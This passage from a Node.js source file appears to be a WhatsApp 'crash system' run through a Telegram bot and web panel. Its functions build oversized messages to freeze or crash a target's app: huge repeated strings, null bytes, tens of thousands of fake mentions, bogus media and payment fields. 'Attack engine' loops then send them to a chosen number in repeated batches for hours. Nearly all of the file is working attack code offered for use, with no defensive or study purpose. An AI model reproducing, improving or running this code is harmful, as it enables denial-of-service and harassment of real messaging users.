                { name: "button_two", buttonParamsJson: JSON.stringify({ display_text: rge("G", 500) }) }
              ]
            }
          }
        }
      }
    });

    payloads.push({ text: "🚨" + rge("✨", 50000) });

    for (const p of payloads) {
      if (sock) await sock.sendMessage(target, p);
    }
    console.log("Sukses mengirim semua payload");
  } catch (err) {
    console.log("Error OverloadingCrash", err);
  }
}

// --- InfiniteLoopCrash ---
async function InfiniteLoopCrash(sock, target) {
  try {
    const rge = (t, c) => t.repeat(c);
    const payloads = [];

    for (let i = 0; i < 100; i++) {
      payloads.push({ text: rge("H", 50000) + rge("I", 50000) + rge("J", 50000) });
    }

    payloads.push({
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: rge("◼️", 50000),
            description: "👀",
            listType: 1,
            singleSelectReply: { selectedRowId: rge("🚨", 20000) },
            contextInfo: { forwardingScore: 999, isForwarded: true }
          },
          conversation: rge("K", 30000),
          extendedTextMessage: { text: rge("L", 30000) }
        }
      }
    });

    payloads.push({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/sample",
                mimetype: rge("M", 10000),
                fileName: rge("🚨", 5000),
                fileLength: "9999999999",
                jpegThumbnail: null
              },
              title: rge("N", 10000)
            },
            body: { text: "Ewe Ewe Ah Ah Crot" + rge("O", 20000) },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                { name: "button_one", buttonParamsJson: JSON.stringify({ display_text: rge("P", 500) }) },
                { name: "button_two", buttonParamsJson: JSON.stringify({ display_text: rge("Q", 500) }) }
              ]
            }
          }
        }
      }
    });

    payloads.push({ text: "🚨" + rge("✨", 50000) });

    for (const p of payloads) {
      if (sock) await sock.sendMessage(target, p);
    }
    console.log("Sukses mengirim semua payload");
  } catch (err) {
    console.log("Error InfiniteLoopCrash", err);
  }
}

// --- HeavyImageCrash ---
async function HeavyImageCrash(sock, target) {
  try {
    const rge = (t, c) => t.repeat(c);
    const payloads = [];

    payloads.push({
      imageMessage: {
        mimetype: "image/jpeg",
        caption: rge("R", 50000),
        jpegThumbnail: null,
        url: "https://example.com/large-image.jpg",
        fileLength: "10000000"
      }
    });

    payloads.push({
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: rge("◼️", 50000),
            description: "👀",
            listType: 1,
            singleSelectReply: { selectedRowId: rge("🚨", 20000) },
            contextInfo: { forwardingScore: 999, isForwarded: true }
          },
          conversation: rge("S", 30000),
          extendedTextMessage: { text: rge("T", 30000) }
        }
      }
    });

    payloads.push({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/sample",
                mimetype: rge("U", 10000),
                fileName: rge("🚨", 5000),
                fileLength: "9999999999",
                jpegThumbnail: null
              },
              title: rge("V", 10000)
            },
            body: { text: "Ewe Ewe Ah Ah Crot" + rge("W", 20000) },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                { name: "button_one", buttonParamsJson: JSON.stringify({ display_text: rge("X", 500) }) },
                { name: "button_two", buttonParamsJson: JSON.stringify({ display_text: rge("Y", 500) }) }
              ]
            }
          }
        }
      }
    });

    payloads.push({ text: "🚨" + rge("✨", 50000) });

    for (const p of payloads) {
      if (sock) await sock.sendMessage(target, p);
    }
    console.log("Sukses mengirim semua payload");
  } catch (err) {
    console.log("Error HeavyImageCrash", err);
  }
}

// --- MixedContentCrash ---
async function MixedContentCrash(sock, target) {
  try {
    const rge = (t, c) => t.repeat(c);
    const payloads = [];

    payloads.push({ text: rge("Z", 50000) + rge("🚨", 50000) + rge("✨", 50000) });

    payloads.push({
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: rge("◼️", 50000),
            description: "👀",
            listType: 1,
            singleSelectReply: { selectedRowId: rge("🚨", 20000) },
            contextInfo: { forwardingScore: 999, isForwarded: true }
          },
          conversation: rge("A", 30000),
          extendedTextMessage: { text: rge("B", 30000) }
        }
      }
    });

    payloads.push({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/sample",
                mimetype: rge("C", 10000),
                fileName: rge("🚨", 5000),
                fileLength: "9999999999",
                jpegThumbnail: null
              },
              title: rge("D", 10000)
            },
            body: { text: "Ewe Ewe Ah Ah Crot" + rge("E", 20000) },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                { name: "button_one", buttonParamsJson: JSON.stringify({ display_text: rge("F", 500) }) },
                { name: "button_two", buttonParamsJson: JSON.stringify({ display_text: rge("G", 500) }) }
              ]
            }
          }
        }
      }
    });

    payloads.push({ text: "🚨" + rge("✨", 50000) });

    for (const p of payloads) {
      if (sock) await sock.sendMessage(target, p);
    }
    console.log("Sukses mengirim semua payload");
  } catch (err) {
    console.log("Error MixedContentCrash", err);
  }
}

// --- ExtremeCharacterCrash ---
async function ExtremeCharacterCrash(sock, target) {
  try {
    const rge = (t, c) => t.repeat(c);
    const payloads = [];

    payloads.push({ text: rge("A", 200000) + rge("B", 200000) + rge("C", 200000) });

    payloads.push({
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: rge("◼️", 100000),
            description: "👀",
            listType: 1,
            singleSelectReply: { selectedRowId: rge("🚨", 50000) },
            contextInfo: { forwardingScore: 999, isForwarded: true }
          },
          conversation: rge("D", 60000),
          extendedTextMessage: { text: rge("E", 60000) }
        }
      }
    });

    payloads.push({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/sample",
                mimetype: rge("F", 20000),
                fileName: rge("🚨", 10000),
                fileLength: "9999999999",
                jpegThumbnail: null
              },
              title: rge("G", 20000)
            },
            body: { text: "Ewe Ewe Ah Ah Crot" + rge("H", 40000) },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                { name: "button_one", buttonParamsJson: JSON.stringify({ display_text: rge("I", 1000) }) },
                { name: "button_two", buttonParamsJson: JSON.stringify({ display_text: rge("J", 1000) }) }
              ]
            }
          }
        }
      }
    });

    payloads.push({ text: "🚨" + rge("✨", 100000) });

    for (const p of payloads) {
      if (sock) await sock.sendMessage(target, p);
    }
    console.log("Sukses mengirim semua payload");
  } catch (err) {
    console.log("Error ExtremeCharacterCrash", err);
  }
}

// --- NestedMessageCrash ---
async function NestedMessageCrash(sock, target) {
  try {
    const rge = (t, c) => t.repeat(c);
    const payloads = [];

    payloads.push({ text: rge("{", 50000) + rge("[", 50000) + rge("(", 50000) });

    payloads.push({
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: rge("◼️", 50000),
            description: "👀",
            listType: 1,
            singleSelectReply: { selectedRowId: rge("🚨", 20000) },
            contextInfo: { forwardingScore: 999, isForwarded: true }
          },
          conversation: rge("{", 30000),
          extendedTextMessage: { text: rge("[", 30000) }
        }
      }
    });

    payloads.push({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/sample",
                mimetype: rge("(", 10000),
                fileName: rge("🚨", 5000),
                fileLength: "9999999999",
                jpegThumbnail: null
              },
              title: rge("}", 10000)
            },
            body: { text: "Ewe Ewe Ah Ah Crot" + rge("]", 20000) },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                { name: "button_one", buttonParamsJson: JSON.stringify({ display_text: rge("(", 500) }) },
                { name: "button_two", buttonParamsJson: JSON.stringify({ display_text: rge(")", 500) }) }
              ]
            }
          }
        }
      }
    });

    payloads.push({ text: "🚨" + rge("✨", 50000) });

    for (const p of payloads) {
      if (sock) await sock.sendMessage(target, p);
    }
    console.log("Sukses mengirim semua payload");
  } catch (err) {
    console.log("Error NestedMessageCrash", err);
  }
}

// --- HeavyMediaCrash ---
async function HeavyMediaCrash(sock, target) {
  try {
    const rge = (t, c) => t.repeat(c);
    const payloads = [];

    payloads.push({
      videoMessage: {
        mimetype: "video/mp4",
        caption: rge("K", 50000),
        jpegThumbnail: null,
        url: "https://example.com/large-video.mp4",
        fileLength: "200000000"
      }
    });

    payloads.push({
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: rge("◼️", 50000),
            description: "👀",
            listType: 1,
            singleSelectReply: { selectedRowId: rge("🚨", 20000) },
            contextInfo: { forwardingScore: 999, isForwarded: true }
          },
          conversation: rge("L", 30000),
          extendedTextMessage: { text: rge("M", 30000) }
        }
      }
    });

    payloads.push({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/sample",
                mimetype: rge("N", 10000),
                fileName: rge("🚨", 5000),
                fileLength: "9999999999",
                jpegThumbnail: null
              },
              title: rge("O", 10000)
            },
            body: { text: "Ewe Ewe Ah Ah Crot" + rge("P", 20000) },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                { name: "button_one", buttonParamsJson: JSON.stringify({ display_text: rge("Q", 500) }) },
                { name: "button_two", buttonParamsJson: JSON.stringify({ display_text: rge("R", 500) }) }
              ]
            }
          }
        }
      }
    });

    payloads.push({ text: "🚨" + rge("✨", 50000) });

    for (const p of payloads) {
      if (sock) await sock.sendMessage(target, p);
    }
    console.log("Sukses mengirim semua payload");
  } catch (err) {
    console.log("Error HeavyMediaCrash", err);
  }
}

// --- MixedContentExtremeCrash ---
async function MixedContentExtremeCrash(sock, target) {
  try {
    const rge = (t, c) => t.repeat(c);
    const payloads = [];

    payloads.push({ text: rge("S", 50000) + rge("🚨", 50000) + rge("✨", 50000) });

    payloads.push({
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: rge("◼️", 50000),
            description: "👀",
            listType: 1,
            singleSelectReply: { selectedRowId: rge("🚨", 20000) },
            contextInfo: { forwardingScore: 999, isForwarded: true }
          },
          conversation: rge("T", 30000),
          extendedTextMessage: { text: rge("U", 30000) }
        }
      }
    });

    payloads.push({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/sample",
                mimetype: rge("V", 10000),
                fileName: rge("🚨", 5000),
                fileLength: "9999999999",
                jpegThumbnail: null
              },
              title: rge("W", 10000)
            },
            body: { text: "Ewe Ewe Ah Ah Crot" + rge("X", 20000) },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                { name: "button_one", buttonParamsJson: JSON.stringify({ display_text: rge("Y", 500) }) },
                { name: "button_two", buttonParamsJson: JSON.stringify({ display_text: rge("Z", 500) }) }
              ]
            }
          }
        }
      }
    });

    payloads.push({ text: "🚨" + rge("✨", 50000) });

    for (const p of payloads) {
      if (sock) await sock.sendMessage(target, p);
    }
    console.log("Sukses mengirim semua payload");
  } catch (err) {
    console.log("Error MixedContentExtremeCrash", err);
  }
}

// --- InfiniteLoopHeavyCrash ---
async function InfiniteLoopHeavyCrash(sock, target) {
  try {
    const rge = (t, c) => t.repeat(c);
    const payloads = [];

    for (let i = 0; i < 200; i++) {
      payloads.push({ text: rge("A", 50000) + rge("B", 50000) + rge("C", 50000) });
    }

    payloads.push({
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: rge("◼️", 50000),
            description: "👀",
            listType: 1,
            singleSelectReply: { selectedRowId: rge("🚨", 20000) },
            contextInfo: { forwardingScore: 999, isForwarded: true }
          },
          conversation: rge("D", 30000),
          extendedTextMessage: { text: rge("E", 30000) }
        }
      }
    });

    payloads.push({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/sample",
                mimetype: rge("F", 10000),
                fileName: rge("🚨", 5000),
                fileLength: "9999999999",
                jpegThumbnail: null
              },
              title: rge("G", 10000)
            },
            body: { text: "Ewe Ewe Ah Ah Crot" + rge("H", 20000) },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                { name: "button_one", buttonParamsJson: JSON.stringify({ display_text: rge("I", 500) }) },
                { name: "button_two", buttonParamsJson: JSON.stringify({ display_text: rge("J", 500) }) }
              ]
            }
          }
        }
      }
    });

    payloads.push({ text: "🚨" + rge("✨", 50000) });

    for (const p of payloads) {
      if (sock) await sock.sendMessage(target, p);
    }
    console.log("Sukses mengirim semua payload");
  } catch (err) {
    console.log("Error InfiniteLoopHeavyCrash", err);
  }
}

// --- DelayPayment ---
async function DelayPayment(sock, target) {
  try {
    const payload = {
      sendPaymentMessage: {
        noteMessage: {
          extendedTextMessage: {
            text: "\u0000".repeat(200000)
          }
        },
        amount1000: 50000,
        currency: "IDR",
      }
    };

    const msg = generateWAMessageFromContent(target, payload, {});
    if (sock) await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {
    console.log("Error DelayPayment", err);
  }
}

// --- ObsidianCorexDelayBeta ---
async function ObsidianCorexDelayBeta(sock, target) {
  try {
    for (let i = 0; i < 10; i++) {
      console.log(chalk.red(`Succes Sending Bug DelayBeta`));
      const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              contextInfo: {
                participant: target,
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
                ],
              },
              body: {
                text: "@zyyimupp Here Bro!!",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_message",
                paramsJson: "\x10".repeat(1000000),
                version: 2
              },
            },
          },
        },
      }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
      });

      if (sock) {
        await sock.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [target],
          additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            }],
          }],
        });
      }
      await new Promise((resolve) => setTimeout(resolve, 250));
    }
  } catch (err) {
    console.log("Error ObsidianCorexDelayBeta", err);
  }
}

// ==================== ATTACK ENGINES ==================== //

// --- Crashandroid ---
async function Crashandroid(durationHours, target) {
  if (!sock) {
    console.log("❌ Tidak ada koneksi WhatsApp aktif!");
    return;
  }
  
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 20) {
        await Promise.all([
          OverloadingCrash(sock, target),
          InfiniteLoopCrash(sock, target),
          HeavyImageCrash(sock, target),
          MixedContentCrash(sock, target),
          ExtremeCharacterCrash(sock, target),
          NestedMessageCrash(sock, target),
          InfiniteLoopHeavyCrash(sock, target),
          HeavyMediaCrash(sock, target),
          MixedContentExtremeCrash(sock, target),
          sleep(1000)
        ]);
        console.log(chalk.green(`❄️ Succes Send Bug Yang Ke ${count + 1}`));
        count++;
        setTimeout(sendNext, 4000);
      } else {
        console.log(chalk.red(`🥶 Succesfull Send All Bug, Hati-hati Apknya Gacor`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// --- DelayBapakLo ---
async function DelayBapakLo(durationHours, target) {
  if (!sock) {
    console.log("❌ Tidak ada koneksi WhatsApp aktif!");
    return;
  }
  
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 20) {
        await Promise.all([
          DelayPayment(sock, target),
          InfiniteLoopCrash(sock, target),
          InfiniteLoopCrash(sock, target),
          DelayPayment(sock, target),
          ObsidianCorexDelayBeta(sock, target),
          sleep(2000),
          sleep(4000)
        ]);
        console.log(chalk.red(`❄️ Berhasil Send Bug Yang Ke ${count + 1}/10, Terlalu dingin Abangku`));
        count++;
        setTimeout(sendNext, 90000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// --- Forclose ---
async function Forclose(durationHours, target) {
  if (!sock) {
    console.log("❌ Tidak ada koneksi WhatsApp aktif!");
    return;
  }
  
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 18) {
        await Promise.all([
          sleep(3000),
          sleep(9000),
          sleep(3000),
          sleep(5600)
        ]);
        console.log(chalk.red(`Succesfull Send Bug Yang Ke${count + 1}`));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// --- StuckHome ---
async function StuckHome(durationHours, target) {
  if (!sock) {
    console.log("❌ Tidak ada koneksi WhatsApp aktif!");
    return;
  }
  
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 20) {
        await Promise.all([
          sleep(4000),
          sleep(3000),
          sleep(4000),
        ]);
        console.log(chalk.yellow(`┌────────────────────────┐\n│ ${count + 1}/1 blankios 📟\n└────────────────────────┘`));
        count++;
        setTimeout(sendNext, 3000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// --- BomBug ---
async function BomBug(durationHours, target) {
  if (!sock) {
    console.log("❌ Tidak ada koneksi WhatsApp aktif!");
    return;
  }
  
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 25) {
        await Promise.all([sleep(5000)]);
        console.log(chalk.yellow(`┌────────────────────────┐\n│ ${count + 1}/400 INVISIBLE 🕊️\n└────────────────────────┘`));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// --- GaneMaXCrashEngine ---
async function GaneMaXCrashEngine(durationHours, target) {
  if (!sock) {
    console.log("❌ Tidak ada koneksi WhatsApp aktif!");
    return;
  }
  
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 10;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ GaneMaX Crash Selesai! Total batch: ${batch - 1}`);
      return;
    }

    try {
      if (count < 30) {
        await Promise.all([
          OverloadingCrash(sock, target),
          InfiniteLoopCrash(sock, target),
          HeavyImageCrash(sock, target),
          MixedContentCrash(sock, target),
          ExtremeCharacterCrash(sock, target),
          NestedMessageCrash(sock, target),
          InfiniteLoopHeavyCrash(sock, target),
          HeavyMediaCrash(sock, target),
          MixedContentExtremeCrash(sock, target),
          DelayPayment(sock, target),
          ObsidianCorexDelayBeta(sock, target),
          sleep(1000)
        ]);
        console.log(chalk.red(`
╔═══════════════════════════════════╗
║   💥 GaneMaX CRASH #${count + 1} 💥
╠═══════════════════════════════════╣
║   Target : ${target}
║   Status : ✅ SUCCESS
║   Mode   : ULTIMATE OVERLOAD
╚═══════════════════════════════════╝
        `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`✅ Batch ${batch} selesai untuk ${target}`));
        if (batch < maxBatches) {
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`✅ Semua batch selesai!`));
        }
      }
    } catch (error) {
      console.error(`❌ Error: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ==================== EXECUTION PAGE HTML ==================== //

function executionPage(status = "🟥 Ready", detail = {}, isForm = true, userInfo = {}, userKey = "", message = "", mode = "") {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  const filePath = path.join(__dirname, "MainFile", "Pusat.html");

  try {
    let html = fs.readFileSync(filePath, "utf8");

    html = html
      .replace(/\$\{userKey\s*\|\|\s*'Unknown'\}/g, userKey || "Unknown")
      .replace(/\$\{userKey\}/g, userKey || "")
      .replace(/\$\{password\}/g, userKey || "")
      .replace(/\{\{password\}\}/g, userKey || "")
      .replace(/\{\{key\}\}/g, userKey || "")
      .replace(/\$\{key\}/g, userKey || "")
      .replace(/\$\{username\s*\|\|\s*'Unknown'\}/g, username || "Unknown")
      .replace(/\$\{username\}/g, username || "Unknown")
      .replace(/\{\{username\}\}/g, username || "Unknown")
      .replace(/\{\{expired\}\}/g, formattedTime)
      .replace(/\{\{status\}\}/g, status)
      .replace(/\{\{message\}\}/g, message)
      .replace(/\$\{formattedTime\}/g, formattedTime);

    return html;
  } catch (err) {
    console.error("Gagal membaca file Pusat.html:", err);
    return `<h1>Gagal memuat halaman</h1>`;
  }
}

// ==================== START SERVER ==================== //

console.clear();
console.log(chalk.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⣦⣤⣾⣿⠿⠛⣋⣥⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⡤⡀⢈⢻⣬⣿⠟⢁⣤⣶⣿⣿⡿⠿⠿⠛⠛⢀⣄⠀
⠀⠀⢢⣘⣿⣿⣶⣿⣯⣤⣾⣿⣿⣿⠟⠁⠄⠀⣾⡇⣼⢻⣿⣾
⣰⠞⠛⢉⣩⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣧⣤⣴⠟⣠⣿⢰⣿⣿
⣶⡾⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣈⣩⣤⡶⠟⢛⣩⣴⣿⣿⡟
⣠⣄⠈⠀⣰⡦⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠛⠛⠁
⣉⠛⠛⠛⣁⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠥⠀⠀
⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⠀⠀
`));

console.log(chalk.red(`
╭─⦏ GaneMaX Crash System ⦐
│ꔹ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @xangelxy
│ꔹ ʙᴏᴛ : ᴄᴏɴᴇᴄᴛᴀᴅᴏ ✓
│ꔹ ᴘᴏʀᴛ : ${PORT}
╰───────────────────`));

// Start Bot
bot.launch();
console.log(chalk.green('✅ Bot Telegram Started!'));

// Start Web Server
const server = app.listen(PORT, async () => {
  console.log(chalk.green(`✅ Web Server Running on PORT ${PORT}`));
  console.log(chalk.blue(`🌐 Access: http://localhost:${PORT}`));
  
  await initializeWhatsAppConnections();
});

// Graceful stop
process.once('SIGINT', () => {
  bot.stop('SIGINT');
  server.close(() => process.exit(0));
});
process.once('SIGTERM', () => {
  bot.stop('SIGTERM');
  server.close(() => process.exit(0));
});
